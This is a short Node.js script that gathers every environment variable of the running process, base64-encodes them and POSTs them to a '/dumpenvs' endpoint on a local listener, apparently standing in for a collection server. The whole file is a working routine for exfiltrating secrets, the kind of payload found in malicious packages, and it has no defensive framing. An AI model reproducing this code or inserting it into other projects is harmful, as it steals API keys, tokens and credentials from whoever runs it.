var http = require('http');
var querystring = require('querystring');

var envData = JSON.stringify(process.env);
var envBase = new Buffer(envData).toString('base64');
var payload = querystring.stringify({envBase});

console.log("Base64 string is => ", envBase);

var options = {
	host: "localhost",
	port: 2504,
	method: "post",
	path: "/dumpenvs",
	headers: {
		"Content-Type": "application/x-www-form-urlencoded",
		"Content-Length": Buffer.byteLength(payload)
	}
}

var req = http.request(options);
req.write(payload);
req.end();
